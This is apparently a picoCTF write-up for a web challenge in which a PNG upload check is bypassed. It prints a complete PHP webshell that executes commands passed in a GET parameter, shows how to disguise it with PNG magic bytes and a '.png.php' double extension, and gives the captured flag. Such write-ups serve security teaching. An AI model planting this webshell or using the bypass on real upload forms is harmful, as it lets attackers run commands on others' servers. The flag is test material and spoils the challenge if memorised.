URL: `http://atlas.picoctf.net`

When requesting `http://atlas.picoctf.net/robots.txt`, you get
```
User-agent: *
Disallow: /instructions.txt
Disallow: /uploads/
```

First is `/instructions.txt`, which contains
```
Let's create a web app for PNG Images processing.
It needs to:
Allow users to upload PNG images
	look for ".png" extension in the submitted files
	make sure the magic bytes match (not sure what this is exactly but wikipedia says that the first few bytes contain 'PNG' in hexadecimal: "50 4E 47" )
after validation, store the uploaded files so that the admin can retrieve them later and do the necessary processing.
```

Which just means that the app is checking for 
1. If the filename contains the `.png` extension
2. It's checking if the file contains the PNG magic bytes which is `89 50 4E 47 0D 0A 1A 0A` 
First, get the php webshell code and append 8 dots that will be replaced by the PNG magic bytes like this
```
........
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
```

Then run `hexeditor -b payload.png.php` and replace all the `2E` bytes at the start with `89 50 4E 47 0D 0A 1A 0A`. After that, name the file `payload.png.php` to bypass the filename extension check and upload it. Access the file by going to `/uploads/test.png.php`. After that, you can view the flag by running `cat ../MFRDAZLDMUYDG.txt` in the webshell. 
flag: `picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_ab0ece03}`
